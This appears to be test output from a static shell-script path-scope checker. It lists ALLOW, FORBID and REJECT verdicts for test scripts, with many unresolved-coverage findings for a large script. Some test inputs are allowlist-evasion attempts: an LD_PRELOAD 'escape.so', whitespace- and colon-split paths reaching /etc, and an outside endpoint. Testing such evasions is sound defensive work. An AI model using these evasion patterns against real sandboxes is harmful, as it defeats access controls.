PATHSCOPE unresolved_path_count=0 unresolved_endpoint_count=0 coverage_issue_count=0 provenance_issue_count=0 parse_issue_count=0
PATH value=/safe verdict=ALLOW-LEXICAL rule=/safe/** sources=PWD uses=line=2:assignment prefix
PATH value=/safe/f verdict=ALLOW-LEXICAL rule=/safe/** sources=ROOT uses=line=2:cat
PATHSCOPE verdict=PASS rc=0 reason=closed_and_allowlisted_lexical_argv_scope
COMMAND_RC=0
=== c2_benign_words ===
PATHSCOPE shell=c2_benign_words.sh
PATHSCOPE semantics=lexical_argv_scope symlink_resolution=not_established mount_boundary=not_established host_probe=none
PATHSCOPE resolved_fs_path_count=1 resolved_net_endpoint_count=0
PATHSCOPE unresolved_path_count=0 unresolved_endpoint_count=0 coverage_issue_count=0 provenance_issue_count=0 parse_issue_count=0
PATH value=/safe/f verdict=ALLOW-LEXICAL rule=/safe/** sources=ROOT uses=line=2:cat
PATHSCOPE verdict=PASS rc=0 reason=closed_and_allowlisted_lexical_argv_scope
COMMAND_RC=0
=== c2_words_with_path ===
PATHSCOPE shell=c2_words_with_path.sh
PATHSCOPE semantics=lexical_argv_scope symlink_resolution=not_established mount_boundary=not_established host_probe=none
PATHSCOPE resolved_fs_path_count=3 resolved_net_endpoint_count=0
PATHSCOPE unresolved_path_count=0 unresolved_endpoint_count=0 coverage_issue_count=1 provenance_issue_count=1 parse_issue_count=0
PATH value=/etc/secret verdict=FORBID rule=- sources=NONE uses=line=2:assignment prefix
PATH value=/safe/denied /etc/secret verdict=ALLOW-LEXICAL rule=/safe/** sources=NONE uses=line=2:assignment prefix
PATH value=/safe/f verdict=ALLOW-LEXICAL rule=/safe/** sources=ROOT uses=line=2:cat
UNRESOLVED line=2 kind=coverage reason=assignment value is a whitespace-separated word list or command text; the single-pathname and word-list readings differ, this tool does not model which consumer splits it, and an option word carrying an attached pathname is not decomposed expression=MSG="denied /etc/secret"
UNRESOLVED line=2 kind=provenance reason=allowlisted path has no preregistered-constant provenance expression=MSG="denied /etc/secret"
PATHSCOPE verdict=REJECT rc=3 reason=static_resolution_incomplete
COMMAND_RC=3
=== c3_ws_relative ===
PATHSCOPE shell=c3_ws_relative.sh
PATHSCOPE semantics=lexical_argv_scope symlink_resolution=not_established mount_boundary=not_established host_probe=none
PATHSCOPE resolved_fs_path_count=4 resolved_net_endpoint_count=0
PATHSCOPE unresolved_path_count=0 unresolved_endpoint_count=0 coverage_issue_count=1 provenance_issue_count=0 parse_issue_count=0
PATH value=/elsewhere/relative/escape.so verdict=FORBID rule=- sources=ROOT uses=line=2:assignment prefix
PATH value=/safe/f verdict=ALLOW-LEXICAL rule=/safe/** sources=ROOT uses=line=2:cat
PATH value=/safe/lib verdict=ALLOW-LEXICAL rule=/safe/** sources=ROOT uses=line=2:assignment prefix
PATH value=/safe/lib relative/escape.so verdict=ALLOW-LEXICAL rule=/safe/** sources=ROOT uses=line=2:assignment prefix
UNRESOLVED line=2 kind=coverage reason=assignment value is a whitespace-separated word list or command text; the single-pathname and word-list readings differ, this tool does not model which consumer splits it, and an option word carrying an attached pathname is not decomposed expression=LD_PRELOAD="$ROOT/lib relative/escape.so"
PATHSCOPE verdict=REJECT rc=3 reason=static_resolution_incomplete
COMMAND_RC=3
=== c3_ws_later_word ===
PATHSCOPE shell=c3_ws_later_word.sh
PATHSCOPE semantics=lexical_argv_scope symlink_resolution=not_established mount_boundary=not_established host_probe=none
PATHSCOPE resolved_fs_path_count=3 resolved_net_endpoint_count=0
PATHSCOPE unresolved_path_count=0 unresolved_endpoint_count=0 coverage_issue_count=1 provenance_issue_count=0 parse_issue_count=0
PATH value=/safe/a verdict=ALLOW-LEXICAL rule=/safe/** sources=ROOT uses=line=2:assignment prefix
PATH value=/safe/a plain verdict=ALLOW-LEXICAL rule=/safe/** sources=ROOT uses=line=2:assignment prefix
PATH value=/safe/f verdict=ALLOW-LEXICAL rule=/safe/** sources=ROOT uses=line=2:cat
UNRESOLVED line=2 kind=coverage reason=assignment value is a whitespace-separated word list or command text; the single-pathname and word-list readings differ, this tool does not model which consumer splits it, and an option word carrying an attached pathname is not decomposed expression=X="$ROOT/a plain"
PATHSCOPE verdict=REJECT rc=3 reason=static_resolution_incomplete
COMMAND_RC=3
=== c3_uri_list ===
PATHSCOPE shell=c3_uri_list.sh
PATHSCOPE semantics=lexical_argv_scope symlink_resolution=not_established mount_boundary=not_established host_probe=none
PATHSCOPE resolved_fs_path_count=2 resolved_net_endpoint_count=1
PATHSCOPE unresolved_path_count=0 unresolved_endpoint_count=0 coverage_issue_count=0 provenance_issue_count=0 parse_issue_count=0
PATH value=/etc/escape verdict=FORBID rule=- sources=URL uses=line=2:assignment prefix
PATH value=/safe/f verdict=ALLOW-LEXICAL rule=/safe/** sources=ROOT uses=line=2:cat
ENDPOINT value=127.0.0.1:8790 verdict=ALLOW-LEXICAL rule=127.0.0.1:8790 sources=URL uses=line=2:assignment prefix
PATHSCOPE verdict=REJECT rc=1 reason=path_outside_allowlist
COMMAND_RC=1
=== c3_uri_pair ===
PATHSCOPE shell=c3_uri_pair.sh
PATHSCOPE semantics=lexical_argv_scope symlink_resolution=not_established mount_boundary=not_established host_probe=none
PATHSCOPE resolved_fs_path_count=1 resolved_net_endpoint_count=2
PATHSCOPE unresolved_path_count=0 unresolved_endpoint_count=0 coverage_issue_count=0 provenance_issue_count=0 parse_issue_count=0
PATH value=/safe/f verdict=ALLOW-LEXICAL rule=/safe/** sources=ROOT uses=line=2:cat
ENDPOINT value=127.0.0.1:8790 verdict=ALLOW-LEXICAL rule=127.0.0.1:8790 sources=URL uses=line=2:assignment prefix
ENDPOINT value=198.51.100.10:9999 verdict=FORBID rule=- sources=URL uses=line=2:assignment prefix
PATHSCOPE verdict=REJECT rc=1 reason=path_outside_allowlist
COMMAND_RC=1
=== c3_colon_whole ===
PATHSCOPE shell=c3_colon_whole.sh
PATHSCOPE semantics=lexical_argv_scope symlink_resolution=not_established mount_boundary=not_established host_probe=none
PATHSCOPE resolved_fs_path_count=3 resolved_net_endpoint_count=0
PATHSCOPE unresolved_path_count=0 unresolved_endpoint_count=0 coverage_issue_count=0 provenance_issue_count=0 parse_issue_count=0
PATH value=/safe/dir/file verdict=ALLOW-LEXICAL rule=/safe/dir/file sources=BASE uses=line=2:assignment prefix
PATH value=/safe/f verdict=ALLOW-LEXICAL rule=/safe/f sources=ROOT uses=line=2:cat
PATH value=/safe/relative:dir/file verdict=FORBID rule=- sources=BASE uses=line=2:assignment prefix
PATHSCOPE verdict=REJECT rc=1 reason=path_outside_allowlist
COMMAND_RC=1
=== c3_empty_only ===
PATHSCOPE shell=c3_empty_only.sh
PATHSCOPE semantics=lexical_argv_scope symlink_resolution=not_established mount_boundary=not_established host_probe=none
PATHSCOPE resolved_fs_path_count=2 resolved_net_endpoint_count=0
PATHSCOPE unresolved_path_count=0 unresolved_endpoint_count=0 coverage_issue_count=0 provenance_issue_count=0 parse_issue_count=0
PATH value=/safe verdict=ALLOW-LEXICAL rule=/safe/** sources=PWD uses=line=2:assignment prefix
PATH value=/safe/f verdict=ALLOW-LEXICAL rule=/safe/** sources=ROOT uses=line=2:cat
PATHSCOPE verdict=PASS rc=0 reason=closed_and_allowlisted_lexical_argv_scope
COMMAND_RC=0
=== c3_empty_only_out ===
PATHSCOPE shell=c3_empty_only_out.sh
PATHSCOPE semantics=lexical_argv_scope symlink_resolution=not_established mount_boundary=not_established host_probe=none
PATHSCOPE resolved_fs_path_count=2 resolved_net_endpoint_count=0
PATHSCOPE unresolved_path_count=0 unresolved_endpoint_count=0 coverage_issue_count=0 provenance_issue_count=0 parse_issue_count=0
PATH value=/elsewhere verdict=FORBID rule=- sources=PWD uses=line=2:assignment prefix
PATH value=/safe/f verdict=ALLOW-LEXICAL rule=/safe/** sources=ROOT uses=line=2:cat
PATHSCOPE verdict=REJECT rc=1 reason=path_outside_allowlist
COMMAND_RC=1
=== c3_cmdtext_noslash ===
PATHSCOPE shell=c3_cmdtext_noslash.sh
PATHSCOPE semantics=lexical_argv_scope symlink_resolution=not_established mount_boundary=not_established host_probe=none
PATHSCOPE resolved_fs_path_count=1 resolved_net_endpoint_count=0
PATHSCOPE unresolved_path_count=0 unresolved_endpoint_count=0 coverage_issue_count=1 provenance_issue_count=0 parse_issue_count=0
PATH value=/safe/f verdict=ALLOW-LEXICAL rule=/safe/** sources=ROOT uses=line=2:cat
UNRESOLVED line=2 kind=coverage reason=assignment value is a whitespace-separated word list or command text; the single-pathname and word-list readings differ, this tool does not model which consumer splits it, and an option word carrying an attached pathname is not decomposed expression=GIT_SSH_COMMAND="ssh -v"
PATHSCOPE verdict=REJECT rc=3 reason=static_resolution_incomplete
COMMAND_RC=3
=== c4_export_quoted ===
PATHSCOPE shell=c4_export_quoted.sh
PATHSCOPE semantics=lexical_argv_scope symlink_resolution=not_established mount_boundary=not_established host_probe=none
PATHSCOPE resolved_fs_path_count=2 resolved_net_endpoint_count=0
PATHSCOPE unresolved_path_count=0 unresolved_endpoint_count=0 coverage_issue_count=0 provenance_issue_count=0 parse_issue_count=0
PATH value=/etc/escape.so verdict=FORBID rule=- sources=NONE uses=line=2:export assignment
PATH value=/safe/f verdict=ALLOW-LEXICAL rule=/safe/** sources=ROOT uses=line=3:cat
PATHSCOPE verdict=REJECT rc=1 reason=path_outside_allowlist
COMMAND_RC=1
=== c4_export_quoted_space ===
PATHSCOPE shell=c4_export_quoted_space.sh
PATHSCOPE semantics=lexical_argv_scope symlink_resolution=not_established mount_boundary=not_established host_probe=none
PATHSCOPE resolved_fs_path_count=4 resolved_net_endpoint_count=0
PATHSCOPE unresolved_path_count=0 unresolved_endpoint_count=0 coverage_issue_count=1 provenance_issue_count=1 parse_issue_count=0
PATH value=/safe verdict=ALLOW-LEXICAL rule=/safe/** sources=NONE uses=line=2:export assignment
PATH value=/safe dir/escape verdict=FORBID rule=- sources=NONE uses=line=2:export assignment
PATH value=/safe/dir/escape verdict=ALLOW-LEXICAL rule=/safe/** sources=NONE uses=line=2:export assignment
PATH value=/safe/f verdict=ALLOW-LEXICAL rule=/safe/** sources=ROOT uses=line=3:cat
UNRESOLVED line=2 kind=coverage reason=assignment value is a whitespace-separated word list or command text; the single-pathname and word-list readings differ, this tool does not model which consumer splits it, and an option word carrying an attached pathname is not decomposed expression='X=/safe dir/escape'
UNRESOLVED line=2 kind=provenance reason=allowlisted path has no preregistered-constant provenance expression='X=/safe dir/escape'
PATHSCOPE verdict=REJECT rc=3 reason=static_resolution_incomplete
COMMAND_RC=3
=== c4_declare_quoted ===
PATHSCOPE shell=c4_declare_quoted.sh
PATHSCOPE semantics=lexical_argv_scope symlink_resolution=not_established mount_boundary=not_established host_probe=none
PATHSCOPE resolved_fs_path_count=2 resolved_net_endpoint_count=0
PATHSCOPE unresolved_path_count=0 unresolved_endpoint_count=0 coverage_issue_count=0 provenance_issue_count=0 parse_issue_count=0
PATH value=/etc/escape.so verdict=FORBID rule=- sources=NONE uses=line=2:declare assignment
PATH value=/safe/f verdict=ALLOW-LEXICAL rule=/safe/** sources=ROOT uses=line=3:cat
PATHSCOPE verdict=REJECT rc=1 reason=path_outside_allowlist
COMMAND_RC=1
=== c4_readonly_quoted ===
PATHSCOPE shell=c4_readonly_quoted.sh
PATHSCOPE semantics=lexical_argv_scope symlink_resolution=not_established mount_boundary=not_established host_probe=none
PATHSCOPE resolved_fs_path_count=2 resolved_net_endpoint_count=0
PATHSCOPE unresolved_path_count=0 unresolved_endpoint_count=0 coverage_issue_count=0 provenance_issue_count=0 parse_issue_count=0
PATH value=/etc/escape.sh verdict=FORBID rule=- sources=NONE uses=line=2:readonly assignment
PATH value=/safe/f verdict=ALLOW-LEXICAL rule=/safe/** sources=ROOT uses=line=3:cat
PATHSCOPE verdict=REJECT rc=1 reason=path_outside_allowlist
COMMAND_RC=1
=== c4_typeset_quoted ===
PATHSCOPE shell=c4_typeset_quoted.sh
PATHSCOPE semantics=lexical_argv_scope symlink_resolution=not_established mount_boundary=not_established host_probe=none
PATHSCOPE resolved_fs_path_count=4 resolved_net_endpoint_count=0
PATHSCOPE unresolved_path_count=0 unresolved_endpoint_count=0 coverage_issue_count=0 provenance_issue_count=0 parse_issue_count=0
PATH value=/etc/escape verdict=FORBID rule=- sources=ROOT uses=line=2:typeset assignment
PATH value=/safe/f verdict=ALLOW-LEXICAL rule=/safe/** sources=ROOT uses=line=3:cat
PATH value=/safe/lib verdict=ALLOW-LEXICAL rule=/safe/** sources=ROOT uses=line=2:typeset assignment
PATH value=/safe/lib:/etc/escape verdict=ALLOW-LEXICAL rule=/safe/** sources=ROOT uses=line=2:typeset assignment
PATHSCOPE verdict=REJECT rc=1 reason=path_outside_allowlist
COMMAND_RC=1
=== c4_local_quoted ===
PATHSCOPE shell=c4_local_quoted.sh
PATHSCOPE semantics=lexical_argv_scope symlink_resolution=not_established mount_boundary=not_established host_probe=none
PATHSCOPE resolved_fs_path_count=2 resolved_net_endpoint_count=0
PATHSCOPE unresolved_path_count=0 unresolved_endpoint_count=0 coverage_issue_count=0 provenance_issue_count=0 parse_issue_count=0
PATH value=/etc/escape verdict=FORBID rule=- sources=NONE uses=line=2:local assignment
PATH value=/safe/f verdict=ALLOW-LEXICAL rule=/safe/** sources=ROOT uses=line=4:cat
PATHSCOPE verdict=REJECT rc=1 reason=path_outside_allowlist
COMMAND_RC=1
=== c4_export_opaque ===
PATHSCOPE shell=c4_export_opaque.sh
PATHSCOPE semantics=lexical_argv_scope symlink_resolution=not_established mount_boundary=not_established host_probe=none
PATHSCOPE resolved_fs_path_count=1 resolved_net_endpoint_count=0
PATHSCOPE unresolved_path_count=0 unresolved_endpoint_count=0 coverage_issue_count=1 provenance_issue_count=0 parse_issue_count=0
PATH value=/safe/f verdict=ALLOW-LEXICAL rule=/safe/** sources=ROOT uses=line=3:cat
UNRESOLVED line=2 kind=coverage reason=export operand is neither an option, a NAME, nor NAME=VALUE after expansion expression="not an assignment"
PATHSCOPE verdict=REJECT rc=3 reason=static_resolution_incomplete
COMMAND_RC=3
=== c4_env_quoted_ctl ===
PATHSCOPE shell=c4_env_quoted_ctl.sh
PATHSCOPE semantics=lexical_argv_scope symlink_resolution=not_established mount_boundary=not_established host_probe=none
PATHSCOPE resolved_fs_path_count=2 resolved_net_endpoint_count=0
PATHSCOPE unresolved_path_count=0 unresolved_endpoint_count=0 coverage_issue_count=0 provenance_issue_count=0 parse_issue_count=0
PATH value=/etc/escape.so verdict=FORBID rule=- sources=NONE uses=line=2:env assignment
PATH value=/safe/f verdict=ALLOW-LEXICAL rule=/safe/** sources=ROOT uses=line=2:cat
PATHSCOPE verdict=REJECT rc=1 reason=path_outside_allowlist
COMMAND_RC=1
=== c4_export_plain_ctl ===
PATHSCOPE shell=c4_export_plain_ctl.sh
PATHSCOPE semantics=lexical_argv_scope symlink_resolution=not_established mount_boundary=not_established host_probe=none
PATHSCOPE resolved_fs_path_count=2 resolved_net_endpoint_count=0
PATHSCOPE unresolved_path_count=0 unresolved_endpoint_count=0 coverage_issue_count=0 provenance_issue_count=0 parse_issue_count=0
PATH value=/safe/f verdict=ALLOW-LEXICAL rule=/safe/** sources=ROOT uses=line=3:cat
PATH value=/safe/ok.so verdict=ALLOW-LEXICAL rule=/safe/** sources=ROOT uses=line=2:export assignment
PATHSCOPE verdict=PASS rc=0 reason=closed_and_allowlisted_lexical_argv_scope
COMMAND_RC=0
=== c3_scalar_ctl ===
PATHSCOPE shell=c3_scalar_ctl.sh
PATHSCOPE semantics=lexical_argv_scope symlink_resolution=not_established mount_boundary=not_established host_probe=none
PATHSCOPE resolved_fs_path_count=1 resolved_net_endpoint_count=0
PATHSCOPE unresolved_path_count=0 unresolved_endpoint_count=0 coverage_issue_count=0 provenance_issue_count=0 parse_issue_count=0
PATH value=/safe/f verdict=ALLOW-LEXICAL rule=/safe/** sources=ROOT uses=line=2:cat
PATHSCOPE verdict=PASS rc=0 reason=closed_and_allowlisted_lexical_argv_scope
COMMAND_RC=0
=== RP6-P0 with placeholder.constants ===
PATHSCOPE verdict=REJECT rc=3 reason=input_parse_error line=7 detail=path contains an unresolved angle-bracket placeholder
COMMAND_RC=3
=== RP7-WPI-RO with placeholder.constants ===
PATHSCOPE verdict=REJECT rc=3 reason=input_parse_error line=7 detail=path contains an unresolved angle-bracket placeholder
COMMAND_RC=3
=== RP6-P0 with real.constants ===
PATHSCOPE shell=RP6-P0.sh
PATHSCOPE semantics=lexical_argv_scope symlink_resolution=not_established mount_boundary=not_established host_probe=none
PATHSCOPE resolved_fs_path_count=7 resolved_net_endpoint_count=0
PATHSCOPE unresolved_path_count=3 unresolved_endpoint_count=0 coverage_issue_count=200 provenance_issue_count=0 parse_issue_count=0
PATH value=/dev/null verdict=FORBID rule=- sources=NONE uses=line=398:redirection >,line=400:redirection >
PATH value=/opt/mtc-bridge/venvs/2ce41e34bceb599d80af24c5c33d835820ec321b/bin/python verdict=ALLOW-LEXICAL rule=/opt/mtc-bridge/venvs/2ce41e34bceb599d80af24c5c33d835820ec321b/** sources=P0_VENV_ROOT uses=line=751:assignment prefix
PATH value=/proc/self/fd/8 verdict=FORBID rule=- sources=NONE uses=line=263:assignment prefix
PATH value=/proc/self/ns/mnt verdict=FORBID rule=- sources=NONE uses=line=262:assignment prefix
PATH value=/proc/self/ns/net verdict=FORBID rule=- sources=NONE uses=line=260:assignment prefix
PATH value=/proc/self/ns/pid verdict=FORBID rule=- sources=NONE uses=line=261:assignment prefix
PATH value=/proc/self/ns/user verdict=FORBID rule=- sources=NONE uses=line=259:assignment prefix
UNRESOLVED line=158 kind=coverage reason=assignment value is not statically known: dynamic shell parameter $? expression=rc=$?
UNRESOLVED line=163 kind=coverage reason=opaque command p0_on_err has no registered argv grammar expression=p0_on_err
UNRESOLVED line=173 kind=coverage reason=assignment value is not statically known: unsupported parameter expansion ${1-} expression=s="${1-}"
UNRESOLVED line=174 kind=coverage reason=assignment value is not statically known: unsupported parameter expansion ${s//$'\r'/ } expression=s="${s//$'\r'/ }"
UNRESOLVED line=175 kind=coverage reason=assignment value is not statically known: unsupported parameter expansion ${s//$'\n'/ } expression=s="${s//$'\n'/ }"
UNRESOLVED line=179 kind=coverage reason=assignment value is not statically known: unsupported parameter expansion ${s:0:400} expression=P0_SAFE="${s:0:400}"
UNRESOLVED line=187 kind=coverage reason=assignment value is not statically known: unsupported parameter expansion ${1-} expression=raw="${1-}"
UNRESOLVED line=214 kind=coverage reason=assignment value is not statically known: dynamic shell parameter $1 expression=rest="$1"
UNRESOLVED line=214 kind=coverage reason=assignment value is not statically known: dynamic shell parameter $2 expression=needle="$2"
UNRESOLVED line=216 kind=coverage reason=assignment value is not statically known: unsupported parameter expansion ${rest#*"$needle"} expression=rest="${rest#*"$needle"}"
UNRESOLVED line=217 kind=coverage reason=assignment value is not statically known: arithmetic expansion expression=n=$(( n + 1 ))
UNRESOLVED line=219 kind=coverage reason=assignment value is not statically known: arithmetic expansion expression=P0_COUNT="$n"
UNRESOLVED line=235 kind=coverage reason=assignment value is not statically known: dynamic shell parameter $1 expression=map="$1"
UNRESOLVED line=235 kind=coverage reason=assignment value is not statically known: dynamic shell parameter $2 expression=want="$2"
UNRESOLVED line=248 kind=coverage reason=assignment value is not statically known: unsupported parameter expansion ${e#*=} expression=P0_LOOKUP="${e#*=}"
UNRESOLVED line=363 kind=coverage reason=assignment value is not statically known: arithmetic expansion expression=P0_TOOL_COUNT_EXPECTED=$(( P0_TOOL_COUNT_EXPECTED + 1 ))
UNRESOLVED line=410 kind=coverage reason=opaque command argument: unpinned variable RUNID expression="$RUNID"
UNRESOLVED line=410 kind=coverage reason=opaque command rp0_require_safe_component has no registered argv grammar expression=rp0_require_safe_component
UNRESOLVED line=412 kind=coverage reason=opaque command argument: unpinned variable EV_STAGE_ID expression="$EV_STAGE_ID"
UNRESOLVED line=412 kind=coverage reason=opaque command rp0_require_safe_component has no registered argv grammar expression=rp0_require_safe_component
UNRESOLVED line=424 kind=coverage reason=assignment value is not statically known: dynamic shell parameter $1 expression=name="$1"
UNRESOLVED line=424 kind=coverage reason=assignment value is not statically known: dynamic shell parameter $2 expression=val="$2"
UNRESOLVED line=424 kind=coverage reason=assignment value is not statically known: dynamic shell parameter $3 expression=min="$3"
UNRESOLVED line=482 kind=coverage reason=assignment value is not statically known: arithmetic expansion expression=P0_FORBIDDEN_GID_COUNT=$(( P0_FORBIDDEN_GID_COUNT + 1 ))
UNRESOLVED line=542 kind=coverage reason=assignment value is not statically known: unpinned variable P0_FIXED_STAT expression=P0_FROZEN_PIN="$P0_FIXED_STAT"
UNRESOLVED line=543 kind=coverage reason=assignment value is not statically known: unpinned variable P0_FIXED_READLINK expression=P0_FROZEN_PIN="$P0_FIXED_READLINK"
UNRESOLVED line=544 kind=coverage reason=assignment value is not statically known: unpinned variable P0_FIXED_ENV expression=P0_FROZEN_PIN="$P0_FIXED_ENV"
UNRESOLVED line=545 kind=coverage reason=assignment value is not statically known: unpinned variable P0_FIXED_FIND expression=P0_FROZEN_PIN="$P0_FIXED_FIND"
UNRESOLVED line=546 kind=coverage reason=assignment value is not statically known: unpinned variable P0_FIXED_SHA256SUM expression=P0_FROZEN_PIN="$P0_FIXED_SHA256SUM"
UNRESOLVED line=547 kind=coverage reason=assignment value is not statically known: unpinned variable P0_FIXED_SYSTEMCTL expression=P0_FROZEN_PIN="$P0_FIXED_SYSTEMCTL"
UNRESOLVED line=548 kind=coverage reason=assignment value is not statically known: unpinned variable P0_FIXED_SS expression=P0_FROZEN_PIN="$P0_FIXED_SS"
UNRESOLVED line=549 kind=coverage reason=assignment value is not statically known: unpinned variable P0_FIXED_CURL expression=P0_FROZEN_PIN="$P0_FIXED_CURL"
UNRESOLVED line=550 kind=coverage reason=assignment value is not statically known: unpinned variable P0_FIXED_TIMEOUT expression=P0_FROZEN_PIN="$P0_FIXED_TIMEOUT"
UNRESOLVED line=551 kind=coverage reason=assignment value is not statically known: unpinned variable P0_FIXED_ID expression=P0_FROZEN_PIN="$P0_FIXED_ID"
UNRESOLVED line=552 kind=coverage reason=assignment value is not statically known: unpinned variable P0_FIXED_GETENT expression=P0_FROZEN_PIN="$P0_FIXED_GETENT"
UNRESOLVED line=553 kind=coverage reason=assignment value is not statically known: unpinned variable P0_FIXED_TRUSTED_PYTHON expression=P0_FROZEN_PIN="$P0_FIXED_TRUSTED_PYTHON"
UNRESOLVED line=572 kind=coverage reason=assignment value is not statically known: unsupported parameter expansion ${p0_pin%%=*} expression=p0_pin_name="${p0_pin%%=*}"
UNRESOLVED line=573 kind=coverage reason=assignment value is not statically known: unsupported parameter expansion ${p0_pin#*=} expression=p0_pin_path="${p0_pin#*=}"
UNRESOLVED line=625 kind=coverage reason=assignment value is not statically known: unsupported parameter expansion ${p0_pin%%=*} expression=P0_PIN_SEEN="$P0_PIN_SEEN$p0_pin_name "
UNRESOLVED line=626 kind=coverage reason=assignment value is not statically known: arithmetic expansion expression=P0_PIN_COUNT=$(( P0_PIN_COUNT + 1 ))
UNRESOLVED line=700 kind=coverage reason=assignment value is not statically known: dynamic shell parameter $1 expression=field="$1"
UNRESOLVED line=700 kind=coverage reason=assignment value is not statically known: dynamic shell parameter $2 expression=label="$2"
UNRESOLVED line=700 kind=coverage reason=assignment value is not statically known: dynamic shell parameter $3 expression=value="$3"
UNRESOLVED line=704 kind=coverage reason=assignment value is not statically known: unsupported parameter expansion ${inner%\]} expression=inner="${inner%\]}"
UNRESOLVED line=704 kind=coverage reason=assignment value is not statically known: unsupported parameter expansion ${value#*:\[} expression=inner="${value#*:\[}"
UNRESOLVED line=780 kind=coverage reason=assignment value is not statically known: dynamic shell parameter $1 expression=t="$1"
UNRESOLVED line=781 kind=coverage reason=assignment value is not statically known: command substitution expression=resolved="$(command -v "$t" 2>&1)"
UNRESOLVED line=781 kind=coverage reason=assignment value is not statically known: dynamic shell parameter $? expression=rc=$?
UNRESOLVED line=797 kind=coverage reason=assignment value is not statically known: unpinned variable P0_LOOKUP expression=pin="$P0_LOOKUP"
UNRESOLVED line=813 kind=coverage reason=assignment value is not statically known: unpinned variable P0_LOOKUP expression=rl="$P0_LOOKUP"
UNRESOLVED line=814 kind=coverage reason=assignment value is not statically known: command substitution expression=canon="$(LC_ALL=C "$rl" -v -f -- "$resolved" 2>&1)"
UNRESOLVED line=814 kind=coverage reason=assignment value is not statically known: dynamic shell parameter $? expression=crc=$?
UNRESOLVED line=814 kind=coverage reason=dynamic command name: unpinned variable rl expression="$rl"
UNRESOLVED line=827 kind=coverage reason=assignment value is not statically known: unpinned variable P0_LOOKUP expression=resolved="$pin"
UNRESOLVED line=845 kind=unresolved_path reason=unpinned variable P0_LOOKUP expression="$resolved"
UNRESOLVED line=847 kind=coverage reason=assignment value is not statically known: unpinned variable P0_TOOLS_RESOLVED expression=P0_TOOLS_RESOLVED="$P0_TOOLS_RESOLVED $t=$resolved"
UNRESOLVED line=848 kind=coverage reason=assignment value is not statically known: unpinned variable P0_TOOLS_RESOLUTION expression=P0_TOOLS_RESOLUTION="$P0_TOOLS_RESOLUTION $t=$P0_RESOLUTION"
UNRESOLVED line=855 kind=coverage reason=assignment value is not statically known: dynamic shell parameter $1 expression=label="$1"
UNRESOLVED line=855 kind=coverage reason=assignment value is not statically known: dynamic shell parameter $2 expression=p="$2"
UNRESOLVED line=857 kind=coverage reason=assignment value is not statically known: command substitution expression=raw="$(LC_ALL=C "$P0_STAT" -c '%F|%a|%u:%g' -- "$p" 2>&1)"
UNRESOLVED line=857 kind=coverage reason=assignment value is not statically known: dynamic shell parameter $? expression=rc=$?
UNRESOLVED line=857 kind=coverage reason=opaque command  has no registered argv grammar expression=
UNRESOLVED line=857 kind=coverage reason=opaque command argument: unpinned variable p expression="$p"
UNRESOLVED line=872 kind=coverage reason=assignment value is not statically known: unsupported parameter expansion ${raw%%|*} expression=P0_META_KIND="${raw%%|*}"
UNRESOLVED line=873 kind=coverage reason=assignment value is not statically known: unsupported parameter expansion ${raw#*|} expression=rest="${raw#*|}"
UNRESOLVED line=874 kind=coverage reason=assignment value is not statically known: unsupported parameter expansion ${rest%%|*} expression=P0_META_MODE="${rest%%|*}"
UNRESOLVED line=875 kind=coverage reason=assignment value is not statically known: unsupported parameter expansion ${rest#*|} expression=P0_META_OWNER="${rest#*|}"
UNRESOLVED line=919 kind=coverage reason=assignment value is not statically known: arithmetic expansion expression=P0_TOOL_COUNT=$(( P0_TOOL_COUNT + 1 ))
UNRESOLVED line=938 kind=coverage reason=assignment value is not statically known: command substitution expression=rawpath="$(LC_ALL=C "$P0_READLINK" -v -- "$P0_FD_SELF" 2>&1)"
UNRESOLVED line=938 kind=coverage reason=assignment value is not statically known: dynamic shell parameter $? expression=rc=$?
UNRESOLVED line=938 kind=coverage reason=opaque command  has no registered argv grammar expression=
UNRESOLVED line=938 kind=coverage reason=opaque command  may forward a path or endpoint expression="$P0_FD_SELF"
UNRESOLVED line=945 kind=coverage reason=assignment value is not statically known: command substitution expression=fdid="$(LC_ALL=C "$P0_STAT" -L -c '%d:%i' -- "$P0_FD_SELF" 2>&1)"
UNRESOLVED line=945 kind=coverage reason=assignment value is not statically known: dynamic shell parameter $? expression=rc=$?
UNRESOLVED line=945 kind=coverage reason=opaque command  has no registered argv grammar expression=
UNRESOLVED line=945 kind=coverage reason=opaque command  may forward a path or endpoint expression="$P0_FD_SELF"
UNRESOLVED line=952 kind=coverage reason=assignment value is not statically known: command substitution expression=logid="$(LC_ALL=C "$P0_STAT" -c '%d:%i' -- "$EV_LOG" 2>&1)"
UNRESOLVED line=952 kind=coverage reason=assignment value is not statically known: dynamic shell parameter $? expression=rc=$?
UNRESOLVED line=952 kind=coverage reason=opaque command  has no registered argv grammar expression=
UNRESOLVED line=952 kind=coverage reason=opaque command argument: unpinned variable EV_LOG expression="$EV_LOG"
UNRESOLVED line=991 kind=coverage reason=assignment value is not statically known: dynamic shell parameter $1 expression=label="$1"
UNRESOLVED line=991 kind=coverage reason=assignment value is not statically known: dynamic shell parameter $2 expression=flag="$2"
UNRESOLVED line=992 kind=coverage reason=assignment value is not statically known: command substitution expression=raw="$(LC_ALL=C "$P0_ID" "$flag" 2>&1)"
UNRESOLVED line=992 kind=coverage reason=assignment value is not statically known: dynamic shell parameter $? expression=rc=$?
UNRESOLVED line=992 kind=coverage reason=opaque command  has no registered argv grammar expression=
UNRESOLVED line=992 kind=coverage reason=opaque command argument: unpinned variable flag expression="$flag"
UNRESOLVED line=1015 kind=coverage reason=assignment value is not statically known: command substitution expression=P0_CAPTURE="$raw"
UNRESOLVED line=1020 kind=coverage reason=assignment value is not statically known: unpinned variable P0_CAPTURE expression=uid="$P0_CAPTURE"
UNRESOLVED line=1024 kind=coverage reason=assignment value is not statically known: unpinned variable P0_CAPTURE expression=gid="$P0_CAPTURE"
UNRESOLVED line=1028 kind=coverage reason=assignment value is not statically known: unpinned variable P0_CAPTURE expression=gids="$P0_CAPTURE"
UNRESOLVED line=1053 kind=coverage reason=assignment value is not statically known: arithmetic expansion expression=count=$(( count + 1 ))
UNRESOLVED line=1155 kind=coverage reason=assignment value is not statically known: dynamic shell parameter $1 expression=acct="$1"
UNRESOLVED line=1156 kind=coverage reason=array assignment is outside the accepted scalar subset expression=p0_pw_parts=(...)
UNRESOLVED line=1166 kind=unresolved_path reason=relative path depends on unpinned PWD expression=<
UNRESOLVED line=1168 kind=coverage reason=assignment value is not statically known: dynamic shell parameter $? expression=getent_rc=$?
UNRESOLVED line=1168 kind=coverage reason=dynamic command name: unpinned variable P0_GETENT expression="$P0_GETENT"
